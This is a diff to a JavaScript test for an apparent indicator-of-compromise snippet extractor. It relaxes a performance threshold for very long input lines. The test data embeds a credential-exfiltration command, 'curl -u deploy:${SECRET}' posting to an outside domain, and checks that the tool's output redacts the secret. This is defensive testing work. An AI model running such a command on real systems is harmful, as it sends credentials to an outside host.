@@ -24,7 +24,8 @@ describe('iocSnippet — long lines', () => {
     const line = '-p x '.repeat(160_000) + `curl -u deploy:${SECRET} https://giftshop.club/up ` + '-p x '.repeat(10_000);
     const start = Date.now();
     const out = iocSnippet(line, domainBoundaryRegex('giftshop.club'));
-    expect(Date.now() - start).toBeLessThan(2_000);
+    // well under a second alone; a quadratic scan of this 800 KB line takes minutes, so the margin absorbs suite load
+    expect(Date.now() - start).toBeLessThan(8_000);
     expect(out).toContain('giftshop.club');
     expect(out).not.toContain(SECRET);
   });
